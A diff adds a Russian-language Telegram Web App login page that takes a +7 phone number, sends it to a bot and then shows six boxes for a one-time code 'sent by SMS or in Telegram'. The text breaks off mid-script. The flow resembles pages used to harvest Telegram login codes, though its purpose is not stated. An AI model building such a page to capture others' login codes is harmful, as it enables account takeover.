@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Вход / Регистрация</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --primary-accent: #6c63ff; /* Фиолетовый акцент */
+            --bg-color: #ffffff;
+            --text-color: #333333;
+            --input-bg: #f5f5f5;
+            --input-border: #cccccc;
+            --transition-speed: 0.3s;
+        }
+
+        /* Адаптация для темной темы Telegram */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #212121;
+                --text-color: #ffffff;
+                --input-bg: #333333;
+                --input-border: #444444;
+            }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 0;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        /* Inputs */
+        .input-group {
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            border: 1px solid var(--input-border);
+            background-color: var(--input-bg);
+            border-radius: 12px;
+            padding: 0 15px;
+            height: 56px;
+        }
+
+        .input-group label {
+            font-size: 14px;
+            font-weight: 500;
+            margin-right: 10px;
+            white-space: nowrap;
+            color: #777; /* Серый текст для меток */
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            flex-grow: 1;
+        }
+
+        .country-code-display {
+            font-size: 16px;
+            font-weight: 500;
+            margin-right: 8px;
+            color: var(--text-color);
+            line-height: 54px; /* Для вертикального выравнивания */
+        }
+
+        .main-input {
+            border: none;
+            background: none;
+            color: var(--text-color);
+            font-size: 16px;
+            flex-grow: 1;
+            outline: none;
+            height: 100%;
+            padding: 0;
+        }
+
+        /* Code Input (6-digit boxes) */
+        .code-input-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-top: 30px;
+            margin-bottom: 20px;
+        }
+
+        .code-digit-input {
+            width: 15%;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid var(--input-border);
+            background-color: var(--input-bg);
+            border-radius: 12px;
+            outline: none;
+            transition: border-color var(--transition-speed);
+        }
+
+        .code-digit-input:focus {
+            border-color: var(--primary-accent);
+        }
+
+        /* Buttons */
+        .primary-button {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: var(--primary-accent);
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity var(--transition-speed), background-color var(--transition-speed);
+        }
+
+        .primary-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .primary-button:not(:disabled):hover {
+            opacity: 0.9;
+        }
+
+        .secondary-button {
+            background: none;
+            border: none;
+            color: var(--primary-accent);
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+            padding: 10px;
+            transition: opacity var(--transition-speed);
+        }
+        
+        .secondary-button:disabled {
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        /* Status Message Area */
+        #status-message {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 12px;
+            background-color: #f0f4ff; /* Светло-фиолетовый фон */
+            color: #4a5568;
+            text-align: center;
+            font-weight: 500;
+            display: none; /* Скрыто по умолчанию */
+        }
+        
+        /* Utility */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="phone-screen">
+        <h1>Вход или Регистрация</h1>
+        <div class="input-group">
+            <div class="phone-input-wrapper">
+                <span class="country-code-display">+7</span>
+                <input 
+                    type="tel" 
+                    id="phone-input" 
+                    class="main-input" 
+                    placeholder="900 123-45-67" 
+                    maxlength="15" 
+                    inputmode="numeric"
+                />
+            </div>
+        </div>
+        <p style="font-size: 14px; color: #777; text-align: center;">Мы отправим вам код по SMS или в Telegram.</p>
+        
+        <button id="send-phone-btn" class="primary-button" disabled>Далее</button>
+    </div>
+
+    <div id="code-screen" class="hidden">
+        <h1>Введите код</h1>
+        <p style="font-size: 14px; color: #777; text-align: center; margin-bottom: 25px;">
+            Мы отправили 6-значный код.
+        </p>
+
+        <div class="code-input-container">
+            <input class="code-digit-input" type="tel" maxlength="1" data-index="0" inputmode="numeric">
+            <input class="code-digit-input" type="tel" maxlength="1" data-index="1" inputmode="numeric">
+            <input class="code-digit-input" type="tel" maxlength="1" data-index="2" inputmode="numeric">
+            <input class="code-digit-input" type="tel" maxlength="1" data-index="3" inputmode="numeric">
+            <input class="code-digit-input" type="tel" maxlength="1" data-index="4" inputmode="numeric">
+            <input class="code-digit-input" type="tel" maxlength="1" data-index="5" inputmode="numeric">
+        </div>
+        
+        <button id="confirm-code-btn" class="primary-button" disabled>Подтвердить</button>
+        <button id="resend-code-btn" class="secondary-button" disabled>Отправить код повторно (60)</button>
+    </div>
+
+    <div id="status-message" class="hidden"></div>
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    const phoneScreen = document.getElementById('phone-screen');
+    const codeScreen = document.getElementById('code-screen');
+    const phoneInput = document.getElementById('phone-input');
+    const sendPhoneBtn = document.getElementById('send-phone-btn');
+    const codeInputs = document.querySelectorAll('.code-digit-input');
+    const confirmCodeBtn = document.getElementById('confirm-code-btn');
+    const resendCodeBtn = document.getElementById('resend-code-btn');
+    const statusMessage = document.getElementById('status-message');
+    const countryCode = '+7'; // Статический код страны
+
+    let timerInterval;
+
+    tg.ready();
+
+    // Функция для очистки и отображения сообщения о состоянии
+    function setStatus(message, isError = false) {
+        statusMessage.textContent = message;
+        statusMessage.style.backgroundColor = isError ? '#ffebeb' : '#f0f4ff';
+        statusMessage.style.color = isError ? '#cc0000' : '#4a5568';
+        statusMessage.classList.remove('hidden');
+    }
+    
+    // --- 1. Логика экрана телефона ---
+
+    // Валидация ввода телефона
+    phoneInput.addEventListener('input', (e) => {
+        // Очистка от всего, кроме цифр и дефисов
+        e.target.value = e.target.value.replace(/[^\d\s-]/g, '');
+        // Простая проверка длины
+        const isValid = e.target.value.replace(/\s|-/g, '').length >= 9;
+        sendPhoneBtn.disabled = !isValid;
+    });
+
+    // Отправка номера телефона боту
+    sendPhoneBtn.addEventListener('click', () => {
+        const rawPhone = phoneInput.value.replace(/\s|-/g, '');
+        const fullPhone = countryCode + rawPhone;
+
+        setStatus('⌛ Отправляю номер и запрашиваю код...', false);
+        sendPhoneBtn.disabled = true;
+
+        // Отправка данных боту
+        tg.sendData(JSON.stringify({
+            step: 'phone',
+            phone: fullPhone
+        }));
+
+        // После отправки данных, WebApp должен показать ожидание
+        // и перейти на экран кода. Бот ответит сообщением о статусе.
+        // Для удобства пользователя, переключаем экран сразу.
+        showCodeScreen();
+    });
+
+    // --- 2. Логика экрана кода ---
+    
+    // Переключение фокуса и сбор кода
+    codeInputs.forEach((input, index) => {
+        input.addEventListener('input', () => {
+            if (input.value.length === 1) {
+                if (index < codeInputs.length - 1) {
+                    codeInputs[index + 1].focus();
+                }
+            }
+            validateCodeInput();
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && input.
